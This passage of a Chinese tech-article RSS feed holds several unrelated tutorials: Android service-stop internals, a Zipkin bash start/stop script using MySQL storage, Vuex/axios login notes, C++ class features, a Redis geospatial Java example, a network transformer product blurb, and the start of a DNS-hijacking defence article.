//ActivityThread//ApplicationThreadpublic final void scheduleStopService(IBinder token) {sendMessage(H.STOP_SERVICE, token);}//消息处理private class H extends Handler {//...public void handleMessage(Message msg) {switch (msg.what) {case STOP_SERVICE:Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, "serviceStop");handleStopService((IBinder)msg.obj);maybeSnapshot();Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);break;//...}}//...}//...private void handleStopService(IBinder token) {Service s = mServices.remove(token);if (s != null) {try {// 关键方法：调用服务的onDestroy生命周期方法s.onDestroy();// 获取服务的上下文环境Context context = s.getBaseContext();// 如果上下文环境是ContextImpl的实例，安排最终的清理工作if (context instanceof ContextImpl) {final String who = s.getClassName();// 安排清理服务关联的资源和数据((ContextImpl) context).scheduleFinalCleanup(who, "Service");}// 等待队列中的工作完成，确保所有异步任务完成QueuedWork.waitToFinish();// 通知ActivityManager服务已经执行完成停止操作try {ActivityManagerNative.getDefault().serviceDoneExecuting(token, SERVICE_DONE_EXECUTING_STOP, 0, 0);} catch (RemoteException e) {//...}} catch (Exception e) {//...}}}
这段代码的主要作用是处理服务的停止请求，包括调用服务的onDestroy方法、清理服务关联的资源和数据，以及通知AMS服务已经停止。代码中的mServices是一个保存服务实例的映射，它使用服务的token作为键。代码中的ContextImpl是Android中上下文环境的实现类，它提供了额外的功能，如安排最终的清理工作。至此。我们就分析清楚了2个关键流程：
AMS.bindService-&gt;service组件onCreate、onBind
AMS.unbindService-&gt;service组件onUnBind、onDestroy
结合上一章中分析的2个关键流程：
AMS.startService-&gt;service组件onCreate、onStartCommand
AMS.stopService-&gt;service组件onDestroy
目前已经对service组件的生命周期和AMS中service组件相关流程有一定的了解。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540158.html</guid><pubDate>Fri, 31 Oct 2025 07:26:27 +0000</pubDate></item><item><title>zipkin启动脚本并指定mysql数据存储</title><link>https://www.ppmy.cn/news/1540159.html</link><description>#!/bin/bash# 配置部分 ############################################################## Zipkin JAR 文件的名称
# 这里指定了 Zipkin 的可执行 JAR 文件，确保该文件在当前目录中可用。
ZIPKIN_JAR="zipkin-server-2.23.2-exec.jar"# PID 文件的位置
# 该文件用于存储运行中 Zipkin 进程的 PID (Process ID)。用于后续检查进程是否在运行，或停止它。
ZIPKIN_PID_FILE="zipkin.pid"# 日志文件的位置
# Zipkin 的日志输出将被重定向到此文件中。
ZIPKIN_LOG_FILE="zipkin.log"# MySQL 配置 ############################################################## Zipkin 的存储类型，指定为 MySQL
STORAGE_TYPE="mysql"# MySQL 数据库的连接主机，使用阿里云的 MySQL RDS 地址
MYSQL_HOST="rm-xx.mysql.rds.aliyuncs.com"# MySQL 数据库的用户名
MYSQL_USER="root"# MySQL 数据库的密码
MYSQL_PASS="123456"# MySQL 数据库的名称
MYSQL_DB="zipkin"# 启动 Zipkin 的命令 #####################################################
# 指定时区 Asia/Shanghai 及使用 MySQL 存储
# 该函数用于启动 Zipkin，使用指定的存储设置 (MySQL) 和时区 (Asia/Shanghai)。
start_zipkin() {# 使用 nohup 命令后台启动 Zipkin，避免其受到终端关闭的影响。# -Duser.timezone=Asia/Shanghai 用于指定 Zipkin 进程的时区为中国标准时间 (UTC+8)。nohup java -Duser.timezone=Asia/Shanghai -jar $ZIPKIN_JAR \--STORAGE_TYPE=$STORAGE_TYPE \--MYSQL_HOST=$MYSQL_HOST \--MYSQL_USER=$MYSQL_USER \--MYSQL_PASS=$MYSQL_PASS \--MYSQL_DB=$MYSQL_DB \&gt; $ZIPKIN_LOG_FILE 2&gt;&amp;1 &amp;# 获取启动的进程 ID，并存入 PID 文件# 使用 `$!` 获取最后一个后台进程的 PID，并将其写入到 PID 文件中，以便后续使用。echo $! &gt; $ZIPKIN_PID_FILEecho "Zipkin started with PID $(cat $ZIPKIN_PID_FILE)"
}# 停止 Zipkin 的命令 #####################################################
# 该函数用于停止运行中的 Zipkin 进程。
stop_zipkin() {# 检查 PID 文件是否存在，确保 Zipkin 进程正在运行if [ -f "$ZIPKIN_PID_FILE" ]; then# 读取 PID 文件中的进程 IDPID=$(cat $ZIPKIN_PID_FILE)# 检查该进程是否正在运行if ps -p $PID &gt; /dev/null 2&gt;&amp;1; thenecho "Stopping Zipkin (PID: $PID)..."# 尝试正常停止进程kill $PIDsleep 5  # 等待 5 秒钟，确保进程有时间正常停止# 再次检查进程是否仍在运行if ps -p $PID &gt; /dev/null 2&gt;&amp;1; thenecho "Failed to stop Zipkin. Force killing it..."# 如果进程未停止，则强制终止进程kill -9 $PIDfi# 删除 PID 文件，表示 Zipkin 已停止rm -f $ZIPKIN_PID_FILEecho "Zipkin stopped."elseecho "Zipkin is not running, but PID file exists. Cleaning up..."# 如果进程不存在但 PID 文件存在，清理无效的 PID 文件rm -f $ZIPKIN_PID_FILEfielseecho "No PID file found. Zipkin may not be running."fi
}# 检查 Zipkin 是否在运行 ##################################################
# 该函数用于检查 Zipkin 是否正在运行。
is_running() {# 检查 PID 文件是否存在if [ -f "$ZIPKIN_PID_FILE" ]; then# 读取 PID 文件中的进程 IDPID=$(cat $ZIPKIN_PID_FILE)# 检查该进程是否正在运行if ps -p $PID &gt; /dev/null 2&gt;&amp;1; thenreturn 0  # 返回 0 表示进程正在运行elsereturn 1  # 返回 1 表示 PID 文件存在但进程不在运行fielsereturn 1  # 返回 1 表示没有 PID 文件，认为 Zipkin 未运行fi
}# 主逻辑 #################################################################
# 该部分是脚本的主逻辑，控制 Zipkin 的启动和停止操作。# 首先检查 Zipkin 是否在运行
if is_running; then# 如果 Zipkin 正在运行，先停止它echo "Zipkin is already running. Stopping it first..."stop_zipkin
fi# 启动 Zipkin
echo "Starting Zipkin..."
start_zipkin
脚本说明
1.
配置部分
ZIPKIN_JAR
：指定
Zipkin
的可执行
JAR
文件，确保该文件在当前工作目录中存在。
ZIPKIN_PID_FILE
：存储
Zipkin
进程的
PID
，用于停止或检查进程是否在运行。
ZIPKIN_LOG_FILE
：指定
Zipkin
运行日志的输出文件路径。
STORAGE_TYPE
、
MYSQL_HOST
、
MYSQL_USER
、
MYSQL_PASS
、
MYSQL_DB
：用于配置
Zipkin
的存储后端为
MySQL
，并提供连接信息。
2.
启动 Zipkin (
start_zipkin
函数)
该函数用于启动
Zipkin
，并将其日志输出到指定的日志文件中，同时将进程的
PID
存储到
PID
文件中。
通过
-Duser.timezone=Asia/Shanghai
，指定了
Zipkin
运行的时区为
Asia/Shanghai
（中国标准时间，UTC+8）。
使用
nohup
命令确保
Zipkin
在后台运行，即使终端关闭也不会影响
Zipkin
的运行。
3.
停止 Zipkin (
stop_zipkin
函数)
该函数用于停止
Zipkin
进程。
它首先检查
PID
文件是否存在，如果存在则读取
PID
并检查进程是否在运行。
如果进程正在运行，首先尝试正常停止它。如果在 5 秒内未能停止进程，则使用
kill -9
强制终止进程。
完成后，删除
PID
文件。
4.
检查 Zipkin 是否在运行 (
is_running
函数)
该函数通过检查
PID
文件是否存在，并验证
PID
对应的进程是否在运行，来判断
Zipkin
是否正在运行。
如果进程正在运行，返回
0
；否则返回
1
。
5.
主逻辑
主逻辑首先调用
is_running
函数，检查
Zipkin
是否在运行。
如果
Zipkin
正在运行，先调用
stop_zipkin
函数停止它。
最后调用
start_zipkin
函数启动
Zipkin
。
使用说明
保存脚本
：
将上面的脚本保存为
zipkin_control.sh
，并赋予可执行权限：
chmod +x zipkin_control.sh
启动或重启 Zipkin
：
运行脚本时，它会先检查
Zipkin
是否正在运行。如果正在运行，则停止它，然后重新启动。
./zipkin_control.sh
日志查看
：
你可以通过查看
zipkin.log
文件来监控
Zipkin
的输出日志：
tail -f zipkin.log
总结
该脚本自动处理
Zipkin
的启动和停止操作，并记录日志和进程信息。
通过使用
PID
文件，可以确保脚本能正确识别并管理
Zipkin
进程。
通过
-Duser.timezone
参数，设置了
Zipkin
的时区，确保日志输出符合指定时区。
启动成功查看地址：http://127.0.0.1:9411/  服务器ip+ 默认端口9411
查询启动情况 ps aux | grep zipkin</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540159.html</guid><pubDate>Fri, 31 Oct 2025 07:26:30 +0000</pubDate></item><item><title>登录前端笔记（二）：vuex管理用户数据；跨域；axios封装；环境；请求响应拦截；权限；用户资料Vuex共享</title><link>https://www.ppmy.cn/news/1540160.html</link><description>一、Vuex登录流程之用户模块：
简言之：点击登录调用actions且得到token，把得到的token提交给mutations从而修改state里的数据。
原视频
（1）Vuex用户模块流程
组件页面里点击登录后，调用stores里的actions，actions里调用登录接口成功后返回一个token值，使用vuex实现一个token数据多处共享（token数据先在
state
里声明数据初始化；然后vuex修改state里数据通过
mutations
里去声明一个方法setToken修改token，然后actions里调用登录接口后是要返回一个token假设值为123，此时调用setToken方法context.commit(‘setToken【也就是mutations的名字】’, ‘123【也就是token值】’）
（2）Vuex持久化问题：
页面刷新后token值又变为null（数据未被存储）
解决：设置token时同步到缓存里，然后从缓存里读取token初始值。（Vuex：state里从缓存中读取token初始值，mutations里同步token到缓存里）
获取、设置、删除token方法（类似localStorage都可以前端缓存数据）
二、Vuex登录流程之调用登录接口
（1）跨域
简言之，直接发送请求时跨域行为，会受到同源策略影响就会报错。所以直接发送请求要么后端做cors，要么前端做代理。此处为代理。
①浏览器同源策略：协议+主机+端口都一样
通过node向目标服务器发送请求，而同源策略只针对浏览器对浏览器之间，而node是服务器。
②配置vue-cli代理解决跨域问题
proxy的path地址为"/api"：意思是
发送的请求里只要携带/api就会把请求转为目标服务器
，对象为目标服务器所存储的内容。属性target为代理的目标服务器地址；改完文件重启项目。
http://localhost:9528是axios会自动给url拼接上；因为代理配置了target内容所以会给url拼接target内容。
（2）axios封装
（1）基地址、超时时间
baseURL：基地址，axios设置一个基地址/api，其余请求可以不用再拼接这个地址/api；
timeout：超时时间，如果服务器在超时时间内没有响应，直接认定此次请求失败；
（2）请求
1）请求拦截器：注入token
把所有token都放在请求拦截器里去统一管理，这样每个请求都不需要再次传入token；
登录之后所有请求经过请求拦截器后都会携带token；
①axios里取token：用户模块部分，在stores里下的user即用户模块里管理token且持久化了token；所以可通过state.user.token获取token；
但stores里的getters可快速访问stores下modules里的app 与settings与 user里的属性；
所以直接getters.token，所以需要在axios里取到getters
不可以
this.$stores.getters
，因为this只可以在组件里的时候使用，this指的是组件实例，组件实例上挂载了$stores属性，但此时this不是组件实例是axios实例；
store 下的 index 文件将store进行export default 即实例是组件的里的this.$stores ，不用this直接引用store也可以使用：store.getters.token
请求头
测试：
2）响应拦截器：是否成功
response有两个参数，一个成功一个失败；
①响应失败
失败的时候需要reject并且提示信息，return Promise.reject(err)终止错误；
error对象里提供了message属性即是错误信息，可以通过alert提示，但现在在使用elementUI ,它有一个message来提示信息；
不可以直接使用
this.$message.warning
，因为在组件里面this指的是组件实例，实例上挂载了
$message
，但此时this是axios实例；
用引用的方式解决，因为本身项目已经装elementUI，此时引用Message进来，它会按需去导出Message方法，此时的Message等同于this.$message
②响应成功
解构赋值：data、message、success
错误执行里才有error对象，此处没有所以new一个错误对象，错误对象提示信息就是message
（3）环境区分
原视频
①开发环境
②生产环境
npm run build:prod
（4）请求模块
封装请求模块
一定要return request因为会返回promise；
await写了一定要有async；
await代表一定会成功，失败时不需要考虑因为axios封装时有错误提示信息；
因为返回的promise是异步的，所以需要await代表一定是promise执行成功了（失败在axios里已经处理过），然后才能去跳转主页
判断是否是开发环境，是的话填手机号密码反之没有；
三、主页权限认证
（1）进度条
（2）如果有token
如果next里有地址不会执行后置守卫，需要手动关闭；
如果next里没有地址会执行后置守卫；
（3）如果没有token
白名单就是不需要token也可以访问的页面（whiteList）；
总结
四、用户资料Vuex共享
原视频
①有token情况下调用action
②</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540160.html</guid><pubDate>Fri, 31 Oct 2025 07:26:33 +0000</pubDate></item><item><title>「C++」类和对象最终回</title><link>https://www.ppmy.cn/news/1540161.html</link><description>目录
前言
初始化列表：
使用及特点：
总结：
案例分析：
类型转换
单参数构造函数：
多参数构造函数：
static成员
友元
内部类
匿名对象
特点
使用方法：
匿名对象使用实例补充：
对象拷贝时的编译器优化
后记
前言
欢迎大家来到小鸥的博客，本篇将带你了解构造函数的初始化列表，构造函数传参时的类型转换，static成员，友元，内部类以及匿名对象等相关内容~
初始化列表：
在前面学习的构造函数实现中，初始化成员变量时使用的都是在函数体内进行赋值的方法，而构造函数还可以通过
初始化列表来进行成员变量的初始化
。
使用及特点：
1.
初始化列表在函数参数列表后，以一个
冒号开始，接着以逗号为分割
，每个成员变量后面跟一括号来放初始值或者表达式：
//Date(int year, int month, int day)Date(int year = 1, int month = 1, int day = 1):_year(year)//(year + 1),_month(month),_day(day){}
其中初始化列表的括号中可以是一个表达式；
2.
每个成员变量在初始化列表中只能出现一次，这是因为
初始化列表
的性质可以认为是成员变量
定义初始化
的地方，就和函数的声明和定义一样，
定义有且只有一个
。
3.
引用成员变量，const成员变量，没有默认构造的类类型成员变量
，都
必须放在初始化列表中
进行初始化，否则将会报错
原因：
引用在定义时必须指定引用对象（类似指针必须指定指向的地址）；
const修饰的变量必须在定义时赋值，后续也不能通过赋值来修改（
const修饰具有常性
）；
类类型的成员变量，定义时会调用默认构造函数，若只存在普通构造函数，又不给参数的话，其定义就会报错，但初始化列表中给它初始值之后，就相当于调用了该类的普通构造函数（传参）
例：
此处的i 和a 就是引用和const成员变量，由于初始化列表的性质类似与定义，所以可以在初始化列表中修改，而不能在函数体中进行修改。
4.
C++11
后支持在成员变量
声明的位置给缺省值
，这个缺省值就是为了在当一个成员变量没有显示在初始化列表中时使用。
此时_day成员没有在初始化列表中，也没有在函数体中进行赋值，所以d1对象定义完成后，得到的_day结果为2.
注意
成员变量声明时的值是一个缺省值，而不是赋值，即只有
既不在初始化列表
中，
也不在函数体中时
，才会使用，和函数的缺省参数性质一样。
成员变量声明处的缺省值，和构造函数参数中的缺省值要注意区分，前者是
未显示在初始化列表中时
使用，而后者是为了
构造函数没有传参时
使用的。
5.
初始化列表中是
按照声明时的顺序进行初始化
（因为开空间时的存放顺序就是按照声明的顺序存放的）的，和成员在初始化列表中的先后顺序无关，但建议保持一致。
总结：
（尽量不在函数体中赋值）
每个构造函数都有初始化列表；
每个成员变量都会进行初始化列表：
显示
写在初始化列表中的成员，直接进行初始化；
不显示
写在初始化列表中的成员：
声明时
有缺省值就用
缺省值
；
没有缺省值：
内置类型成员变量
：不确定，看编译器，大概率为随机值；
​
自定义类型成员变量
：
调用它的默认构造
，没有则报错；
引用，const修饰，没有默认构造的类类型成员变量
，
必须显示写在初始化列表中进行初始化
。
案例分析：
结果分析：
由声明顺序可知，_b先声明，所以先初始化，但由于此时_a还未进行初始化，所以_b初始化结果为零；
_a初始化使用传值参数a的值进行初始化，所以结果为1；
综合可知：声明时成员变量的缺省值只有在对其自身初始化时起作用，_a在作为初始值为_b初始化时，还未进行初始化，所以_b结果为随机值，而不是_a的缺省值
类型转换
C++支持内置类型隐式转换为类类型对象，但要保证自定义类型兼容该内置类型，且类类型中存在兼容该内置类型的构造函数。
在构造函数前加上关键字
explicit
可以禁止该类型转换
单参数构造函数：
class A
{
public:void Print(){cout &lt;&lt; _a &lt;&lt; endl;}A(int i = 0):_a(i){}//拷贝构造函数A(const A&amp; pa):_a(pa._a){}
private:int _a;
};class Stack
{
public:void Push(const A&amp; a){//....}
private:A _arr[10];int top;
};int main()
{A aa1(1);//传参给构造函数进行正常构造aa1.Print();A aa3 = aa1;//调用拷贝构造// 隐式类型转换// 2先隐式转换为double，构造出一个A类型的临时对象，再将临时对象拷贝构造到aa2// 编译器中遇到构造+拷贝构造-&gt;优化为直接构造A aa2 = 2;aa2.Print();//A&amp; raa2 = aa2;//引用//const A&amp; raa3 = 2;//2类型转换产生临时变量具有常性，所以必须加上const才能引用Stack st;st.Push(aa1);st.Push(3);//int类型转换为A类型return 0;
}
上述代码中，构造函数加上explicit：
多参数构造函数：
class A
{
public:A(int a = 1, int b = 1):_a(a), _b(b){}private:int _a;int _b;
};
class Stack
{
public:void Push(const A&amp; a){//....}
private:A _arr[10];int top;
};
int main()
{A aa1(2, 2);A aa2 = { 2,2 };Stack st1;st1.Push(aa1);st1.Push({ 2,2 });return 0;
}
参数为多个时，类型转换要用大括号括起来。
总结：C++支持隐式类型转换，是借助构造函数来进行的。
static成员
1. static修饰的成员变量，称为静态成员变量，
静态成员变量必须在类外进行初始化
；
2. 静态成员变量是该类的所有对象共享的，不单独属于某个对象，也不存在对象中，而是存在静态区中，
所有对象都可以调用
；
3. static修饰成员函数，叫做静态成员函数，
静态成员函数不存在this指针
；
4. 静态成员函数只能访问其他静态成员函数，由于没有this指针，所以
不能访问非静态成员变量
；
5.
非静态成员函数，可以随意访问静态成员变量和函数
；
6. 静态成员也
受public，private，protected访问限定符的限制
；
7. 静态成员为public时，可通过
类名::静态成员
和
对象名::静态成员
两种方式来外部访问；
8. 静态成员声明时不能添加缺省值，因为静态成员要在类外部定义初始化，不属于某个对象，而声明时的缺省值是用于初始化列表进行初始化的，
静态成员不走构造函数的初始化列表路线。
class A
{
public:static int _b;//开放静态成员,可外部访问static void func(){cout &lt;&lt; _a &lt;&lt; endl;cout &lt;&lt; _b &lt;&lt; endl;//cout &lt;&lt; _c &lt;&lt; endl;//3. 4. 静态成员函数没有this指针，无法调用非静态成员，报错}void Print(){cout &lt;&lt; _a &lt;&lt; endl;cout &lt;&lt; _b &lt;&lt; endl;cout &lt;&lt; _c &lt;&lt; endl;}void Set(int a){_a = a;}
private://1. 8. 声明时的缺省值用于初始化列表，而静态成员不在构造函数中定义，所以不能有缺省值//static int _i = 1;//错误static int _a;//私有静态成员int _c = 0;
};int A::_a = 1;
int A::_b = 1;int main()
{A aa1;      //_a _b _caa1.Print();// 1  1  0A aa2;//2. 对象aa2修改静态成员_a后，aa1打印出来_a也随之改变aa2.Set(2); //_a _b _caa1.Print();// 2  1  0A::func();// 2 1aa2.func();return 0;
}
友元
友元分为友元函数和友元类，其提供了一种突破类访问限定符封装的方式，将函数声明或者类声明的前面加上friend关键字，并且将其放到一个类里面，就构成了友元声明。
外部友元函数
可以
访问类的private和protected的成员
，友元函数只是一个声明，而
不会成为该类的成员函数
；
友元声明可以在类定义的任何地方声明，
不受访问限定符的限制
；
一个函数可以是多个类的友元函数
；
友元类中的成员函数都可以是另一个类的友元函数，都可以访问另一个类中的private和protected成员；
友元类的关系是单向的
，不具有交换性，若A类是B类的友元类，则B类可以访问A类的成员，但B类不是A类的友元类，就不能访问，除非也在B类中加上A类的友元声明；
友元关系不具有传递性
，如果A类是B类的友元，B类是C类的友元，不代表A类就是C类的友元，而需要单独声明；
友元有时提供了一定的便利性，但
友元会增加耦合度，破坏封装性
，所以友元不宜多用。
class B;class A
{
public://PPrint是A类的友元函数，可以访问其方法和成员friend void PPrint(const A&amp; aa, const B&amp; bb);friend class B;A(char a = 'a', char b = 'a'):_a(a),_b(b){}void PrintA() const{cout &lt;&lt; _a &lt;&lt; endl;cout &lt;&lt; _b &lt;&lt; endl;}
private:char _a;char _b;
};
class B
{friend void PPrint(const A&amp; aa, const B&amp; bb);
public:B(char a = 'b', char b = 'b'):_a(a),_b(b){};void PrintB() const{cout &lt;&lt; _a &lt;&lt; endl;cout &lt;&lt; _b &lt;&lt; endl;}
private:char _a;char _b;
};
void PPrint(const A&amp; aa, const B&amp; bb)
{//友元可以访问private和protected成员cout &lt;&lt; aa._a &lt;&lt; endl;cout &lt;&lt; bb._b &lt;&lt; endl;
}
int main()
{A aa;B bb;PPrint(aa, bb);return 0;
}
内部类
如果一个类定义在另一个类的内部，则这个类成为该类的内部类。
内部类是一个独立的类，与定义在全局的类相比，
只是受到了类域的限制和访问操作符的限制
，所以一个类定义的对象中不会包含其内部类。
内部类默认是其外部类的友元类
，反之不成立。
内部类也是一种封装，当A类和B类紧密关联，A类主要的作用就是为B类服务时，就可以设计为内部类，若放到private和protected中，那么A类就为B类的专属内部类，其它地方将无法使用。
class A
{
public://构造函数A(int a = 1):_a(a){cout &lt;&lt; "A(int a = 1)" &lt;&lt; endl;}//拷贝构造函数A(const A&amp; aa){cout &lt;&lt; "A(const A&amp; aa)" &lt;&lt; endl;_a = aa._a;}//析构函数~A(){cout &lt;&lt; "~A()" &lt;&lt; endl;_a = 0;}void PrintA(){cout &lt;&lt; "void PrintA()" &lt;&lt; endl;//B()._b;//不能直接调用B类的成员变量，需要友元声明B().PrintB(A());}
private:int _a = 1;//A类的私有内部类class B{public://friend class A;void PrintB(const A&amp; aa){cout &lt;&lt; "void PrintB(const A&amp; aa)" &lt;&lt; endl;//可以直接调用A类的成员变量，因为内部类默认为外部类的友元类cout &lt;&lt; aa._a &lt;&lt; endl;}private:int _b;};
};
int main()
{A a1(2);a1.PrintA();return 0;
}
运行结果：
图示结果分析
可知，对象a1先构造，然后调用PrintA函数，PrintA函数中创建了一个
匿名对象
来调用B类中的函数PrintB，所以打印出来的结果为1；
也说明B作为内部类可以直接调用A类的成员变量，是A的友元类，但反之A默认不是B的友元，需要单独声明。
匿名对象
特点
用 类型(实参) 的方式定义出来的对象叫做匿名对象，而之前定义对象的方式 类型 对象名(实参) 定义出的对象叫有名对象
匿名对象的生命周期只在其所在的一行，当需要定义一个对象临时使用时，就可以定义为匿名对象。
使用方法：
类名().成员函数();
#include &lt;iostream&gt;
using namespace std;class A
{
public:A(int a = 1):_a(a){cout &lt;&lt; "A(int a = 1)" &lt;&lt; endl;}A(const A&amp; aa){cout &lt;&lt; "A(const A&amp; aa)" &lt;&lt; endl;_a = aa._a;}~A(){cout &lt;&lt; "~A()" &lt;&lt; endl;_a = 0;}void Print(){cout &lt;&lt; "void Print()" &lt;&lt; endl;}
private:int _a = 1;
}int main()
{A().Print();//当前行结束后，匿名对象就会销毁return 0;
}
匿名对象使用实例补充：
万能头文件：&lt;bits/stdc++&gt; 会将常用的头文件一并包含。
不建议日常使用，只在竞赛时节省时间时有用。
对象拷贝时的编译器优化
在
不影响正确性的前提下
，对
连续的构造和拷贝构造进行优化合并
，从而减少拷贝消耗，提高代码速度
图中aa原本为隐式类型转换，先构造再拷贝构造，但编译器优化为直接构造，从而提升效率。
后记
感谢各位读者的阅读，欸，有不足的地方还是请大家继续指正哈~
本期专栏：C++_海盗猫鸥的博客-CSDN博客
个人主页：海盗猫鸥-CSDN博客
感谢各位的关注~</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540161.html</guid><pubDate>Fri, 31 Oct 2025 07:26:34 +0000</pubDate></item><item><title>高效地理位置数据处理：Redis Geospatial Indexes详解</title><link>https://www.ppmy.cn/news/1540162.html</link><description>在现代应用中，地理位置数据处理变得越来越重要。无论是共享单车、外卖配送还是社交应用，地理位置服务都扮演着关键角色。Redis提供了Geospatial Indexes数据结构，能够高效地存储和查询地理位置数据。本文将介绍Redis的Geospatial Indexes的基本功能及其应用场景，并提供Java代码示例来实现这些功能。
一，什么是Geospatial Indexes
Redis的Geospatial Indexes是一种用于存储和查询地理位置数据的数据结构。它支持以下几种基本操作：
添加地理位置数据
：将地理位置数据（经纬度）与某个对象（如用户ID、地点名称）关联并存储。
查询附近位置
：查找某个位置附近的所有对象。
计算距离
：计算两个地理位置之间的距离。
获取位置
：获取某个对象的地理位置。
二，Geospatial Indexes的应用场景
共享单车定位
：查找用户附近的可用单车。
外卖配送
：查找用户附近的餐馆或配送员。
社交应用
：查找用户附近的好友或活动。
物流配送
：优化配送路径，查找最近的配送点。
三，代码实现
首先，在你的Maven项目中引入Jedis依赖：
&lt;
dependency
&gt;
&lt;
groupId
&gt;
redis.clients
&lt;/
groupId
&gt;
&lt;
artifactId
&gt;
jedis
&lt;/
artifactId
&gt;
&lt;
version
&gt;
3.5.2
&lt;/
version
&gt;
&lt;/
dependency
&gt;
以下是一个使用Jedis和Redis的Geospatial Indexes进行地理位置数据处理的Java示例代码：
import
redis
.
clients
.
jedis
.
Jedis
;
import
redis
.
clients
.
jedis
.
GeoCoordinate
;
import
redis
.
clients
.
jedis
.
GeoRadiusResponse
;
import
redis
.
clients
.
jedis
.
params
.
geo
.
GeoRadiusParam
;
import
java
.
util
.
List
;
public
class
GeospatialExample
{
private
static
final
String
GEO_KEY
=
"locations"
;
public
static
void
main
(
String
[
]
args
)
{
// 连接到本地的Redis服务器
Jedis
jedis
=
new
Jedis
(
"localhost"
)
;
// 添加一些地理位置数据
jedis
.
geoadd
(
GEO_KEY
,
116.407526
,
39.904030
,
"Beijing"
)
;
jedis
.
geoadd
(
GEO_KEY
,
121.473701
,
31.230416
,
"Shanghai"
)
;
jedis
.
geoadd
(
GEO_KEY
,
114.057868
,
22.543099
,
"Shenzhen"
)
;
jedis
.
geoadd
(
GEO_KEY
,
113.264385
,
23.129112
,
"Guangzhou"
)
;
// 查询某个位置附近的所有对象
List
&lt;
GeoRadiusResponse
&gt;
nearbyLocations
=
jedis
.
georadius
(
GEO_KEY
,
116.407526
,
39.904030
,
1000
,
GeoUnit
.
KM
)
;
System
.
out
.
println
(
"Locations within 1000 KM of Beijing:"
)
;
for
(
GeoRadiusResponse
location
:
nearbyLocations
)
{
System
.
out
.
println
(
location
.
getMemberByString
(
)
)
;
}
// 计算两个地理位置之间的距离
Double
distance
=
jedis
.
geodist
(
GEO_KEY
,
"Beijing"
,
"Shanghai"
,
GeoUnit
.
KM
)
;
System
.
out
.
println
(
"Distance between Beijing and Shanghai: "
+
distance
+
" KM"
)
;
// 获取某个对象的地理位置
List
&lt;
GeoCoordinate
&gt;
coordinates
=
jedis
.
geopos
(
GEO_KEY
,
"Beijing"
)
;
if
(
coordinates
!=
null
&amp;&amp;
!
coordinates
.
isEmpty
(
)
)
{
GeoCoordinate
coordinate
=
coordinates
.
get
(
0
)
;
System
.
out
.
println
(
"Coordinates of Beijing: "
+
coordinate
.
getLongitude
(
)
+
", "
+
coordinate
.
getLatitude
(
)
)
;
}
// 关闭连接
jedis
.
close
(
)
;
}
}
四，代码解析
连接到Redis服务器
：
Jedis
jedis
=
new
Jedis
(
"localhost"
)
;
这里我们使用Jedis连接到本地的Redis服务器。如果你的Redis服务器在其他地方，请替换为相应的IP地址和端口。
添加地理位置数据
：
jedis
.
geoadd
(
GEO_KEY
,
116.407526
,
39.904030
,
"Beijing"
)
;
jedis
.
geoadd
(
GEO_KEY
,
121.473701
,
31.230416
,
"Shanghai"
)
;
jedis
.
geoadd
(
GEO_KEY
,
114.057868
,
22.543099
,
"Shenzhen"
)
;
jedis
.
geoadd
(
GEO_KEY
,
113.264385
,
23.129112
,
"Guangzhou"
)
;
我们使用
geoadd
命令将地理位置数据添加到Redis中。
查询附近位置
：
List
&lt;
GeoRadiusResponse
&gt;
nearbyLocations
=
jedis
.
georadius
(
GEO_KEY
,
116.407526
,
39.904030
,
1000
,
GeoUnit
.
KM
)
;
使用
georadius
命令查找指定位置附近的所有对象。
计算距离
：
Double
distance
=
jedis
.
geodist
(
GEO_KEY
,
"Beijing"
,
"Shanghai"
,
GeoUnit
.
KM
)
;
使用
geodist
命令计算两个地理位置之间的距离。
获取某个对象的地理位置
：
List
&lt;
GeoCoordinate
&gt;
coordinates
=
jedis
.
geopos
(
GEO_KEY
,
"Beijing"
)
;
if
(
coordinates
!=
null
&amp;&amp;
!
coordinates
.
isEmpty
(
)
)
{
GeoCoordinate
coordinate
=
coordinates
.
get
(
0
)
;
System
.
out
.
println
(
"Coordinates of Beijing: "
+
coordinate
.
getLongitude
(
)
+
", "
+
coordinate
.
getLatitude
(
)
)
;
}
使用
geopos
命令获取某个对象的地理位置。
关闭连接
：
jedis
.
close
(
)
;
最后，关闭Jedis连接。
五，总结
通过本文的介绍和代码示例，我们了解了如何使用Redis的Geospatial Indexes进行地理位置数据的存储和查询。我们展示了如何添加地理位置数据、查询附近位置、计算距离以及获取某个对象的地理位置。Redis的Geospatial Indexes提供了一种高效且易用的方式来处理地理位置数据，适用于各种需要地理位置服务的应用场景。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540162.html</guid><pubDate>Fri, 31 Oct 2025 07:26:38 +0000</pubDate></item><item><title>千兆超薄lan transformer H82412S应用主板英特尔光仟网卡</title><link>https://www.ppmy.cn/news/1540163.html</link><description>千兆超薄lan transformer H82412S应用主板英特尔光仟网卡：I992643OO38
网卡
网络变压器
应用广泛，但如何找到适合自己公司使用的产品，还真要对
网络变压器
有一定的了解才行，这节将和大家分享有关知识点，希望大家喜欢
。
一，lan transformer指的是什么产品呢？
lan transformer 它一款被动电子元器件在网络产品当中起到隔离，抗干扰，滤波，防雷击，耐压等能功能，也是网络产品比不可少的电子元器件组件。
lan transformer 也分集成和分离式两种，集成主要应用在PCB板子空小的产品上，lan transformer主要应用在交换机，路由器，光猫，网卡上。
图下是一款网卡用的lan transformer H82412S</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540163.html</guid><pubDate>Fri, 31 Oct 2025 07:26:39 +0000</pubDate></item><item><title>被DNS污染劫持，怎么见招拆招？</title><link>https://www.ppmy.cn/news/1540164.html</link><description>在畅游互联网的海洋时，我们可能会遭遇DNS污染劫持这一 “暗礁”，它就像一个隐藏在暗处的 “海盗”，干扰着我们正常的网络航行。那么，当遇到DNS污染劫持时，我们该如何见招拆招呢？
首先，我们要明白DNS污染劫持是怎么回事。简单来说，DNS就像是互联网世界的 “导航员”，它负责将我们输入的域名转换为对应的IP地址，以便我们能够准确地访问网站。而 DNS 污染劫持则是攻击者通过篡改DNS解析结果，将我们引导至错误的网站。这可能导致我们访问到恶意网站，面临信息泄露、财产损失等风险。
当发现可能被DNS污染劫持时，我们可以先检查自己设备的DNS设置
